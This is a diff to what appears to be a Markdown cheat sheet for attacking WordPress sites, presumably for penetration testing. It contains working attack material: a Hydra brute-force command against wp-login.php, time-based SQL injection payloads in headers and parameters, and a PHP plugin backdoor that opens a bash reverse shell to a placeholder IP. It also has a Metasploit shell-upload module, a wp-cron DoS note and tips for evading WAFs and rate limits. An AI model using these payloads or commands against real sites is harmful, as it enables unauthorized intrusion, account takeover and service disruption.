@@ -88,6 +88,35 @@ wpscan --url https://target.com -e u
 
 ---
 
+#### Vulnerability Scan
+```bash
+wpscan --url https://target.com --api-token YOUR_TOKEN
+```
+
+---
+
+### WPScan CLI Options Summary
+
+- `-e`: Enumeration
+  - `u`: users
+  - `vp`: vulnerable plugins
+  - `vt`: vulnerable themes
+  - `ap`: all plugins
+  - `at`: all themes
+  - `cb`: config backup files
+- `--api-token`: required for vulnerability DB
+- `--random-user-agent`: evade WAF
+- `--enumerate`: same as `-e`
+- `--plugins-detection`: `passive`, `mixed`, `aggressive`
+
+---
+
+### Register enabled
+- Check this URL and try to register
+`http://example.com/wp-login.php?action=register`
+
+---
+
 ## Attack Scenarios
 
 ### ☐ Get Usernames On The Website Or Add User And Login
@@ -124,7 +153,7 @@ wpscan --url https://target.com -e u
   /index.php?rest_route=/wp-json/wp/v2/users
   /index.php?rest_route=/wp/v2/users
   /author-sitemap.xml
-  /wp-content/debug.log
+  /wp-content/debug.log   # to find log file.
   ```
 
 ---
@@ -194,6 +223,10 @@ Host: target.com
 
 log=USERNAME&pwd=PASSWORD&wp-submit=Log+In&redirect_to=http://target.com/wp-admin/&testcookie=1
 ```
+#### Case (8): Brute-Force via Hydra
+  ```bash
+  hydra -L users.txt -P passwords.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Dashboard"
+  ```
 
 ---
 
@@ -290,7 +323,7 @@ X-Forwarded-For: '+(select*from(select(sleep(10)))a)$2b'
 Referer: '+(select*from(select(sleep(10)))a)$2b'
 ```
 - Try sending common parameters manually, even if they're not shown in the frontend. Sometimes the backend processes them silently:
-```http
+```
 /wp-json?debug='+select*from(select(sleep(10)))a$2b
 /wp-json?search='+select*from(select(sleep(10)))a$2b
 /wp-json?id='+select*from(select(sleep(10)))a$2b
@@ -301,7 +334,7 @@ Referer: '+(select*from(select(sleep(10)))a)$2b'
 ### ☐ DoS via `wp-cron.php`
 
 - URL: `/wp-cron.php`
-- Can cause DoS on high traffic sites.
+- By default, the wp-cron.php is called on every page load (anytime a client requests any Wordpress page), which on high-traffic sites (DoS).
 
 ```xml
 <methodCall>
@@ -325,13 +358,13 @@ use exploit/unix/webapp/wp_admin_shell_upload
 
 ### ☐ Remote Code Execution (RCE) via XML-RPC
 
-- Ref: https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s
+- Ref: `https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s`
 
 ---
 
 ### ☐ PHP Plugin Remote Code Execution (RCE)
-
-- Payload:
+- It may be possible to upload .php files as a plugin.
+- Create your php backdoor, Payload:
 ```php
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_LOCAL_IP/PORT 0>&1'");
@@ -340,30 +373,6 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/YOUR_LOCAL_IP/PORT 0>&1'");
 
 - Upload as plugin and activate.
 - Ref: `https://www.hackingarticles.in/wordpress-reverse-shell`
-
-
----
-
-#### Vulnerability Scan
-```bash
-wpscan --url https://target.com --api-token YOUR_TOKEN
-```
-
----
-
-### WPScan CLI Options Summary
-
-- `-e`: Enumeration
-  - `u`: users
-  - `vp`: vulnerable plugins
-  - `vt`: vulnerable themes
-  - `ap`: all plugins
-  - `at`: all themes
-  - `cb`: config backup files
-- `--api-token`: required for vulnerability DB
-- `--random-user-agent`: evade WAF
-- `--enumerate`: same as `-e`
-- `--plugins-detection`: `passive`, `mixed`, `aggressive`
 
 ---
 
@@ -381,6 +390,9 @@ wpxploit -u https://target.com
   - Exploit-DB
   - WPScan Vulnerability Database
 (*) It depends on the same fingerprint used by WPScan.
+
+#### Theme/Plugin with Known RCE
+- After detecting plugins via `wpscan` or `wpxploit`, search Exploit-DB or use Metasploit modules.
 
 ---
 
@@ -406,66 +418,12 @@ https://target.com/wp-config.php~
 
 ---
 
-### Fingerprinting Summary
-
-- Passive:
-  - HTTP headers (`X-Pingback`, `Link`, `Server`)
-  - Meta tags: `<meta name="generator" content="WordPress x.x.x" />`
-- Active:
-  - Accessing common paths:
-    - `/readme.html`, `/wp-login.php`, `/wp-admin/`
-  - Author enumeration → get usernames
-
----
-
 ### Useful Tools
 
 - `wpscan` – CLI scanner for WP vulnerabilities
 - `wpxploit` – Fingerprinting & vuln scan
 - `whatweb` – Web technology detection
+- `wappalyzer` – Web technology detection
 - `nmap` – WP scripts + version detection
 - `builtwith` – Online tech stack detector
 
----
-
-### Scenarios
-
-#### 1. Version & Plugin Enumeration → Vulnerability Lookup
-1. Use `wpscan` to enumerate version and plugins.
-2. Lookup vulnerabilities from the WPScan API or `exploit-db`.
-
-#### 2. Exposed Backup or Readable Files
-- Examples:
-  - `wp-config.php.bak`
-  - `.git/config`
-  - `debug.log`
-  - `readme.html` showing version
-
-#### 3. Author Enumeration + Brute Force
-- Extract usernames via:
-  ```bash
-  wpscan -e u
-  ```
-- Brute-force via Hydra:
-  ```bash
-  hydra -L users.txt -P passwords.txt target.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:S=Dashboard"
-  ```
-
-#### 4. Theme/Plugin with Known RCE
-- After detecting plugins via `wpscan` or `wpxploit`, search Exploit-DB or use Metasploit modules.
-
----
-
-### Tips
-
-- Add custom headers to avoid blocking:
-  ```bash
-  wpscan --url https://target.com --random-user-agent --user-agent "Mozilla/5.0..."
-  ```
-- Try VPN/Proxy if target rate-limits requests.
-- Use `-o` in `wpscan` to output results to file.
-- Disable JS in browser to make source analysis easier.
-
----
-
-## Attack Scenarios
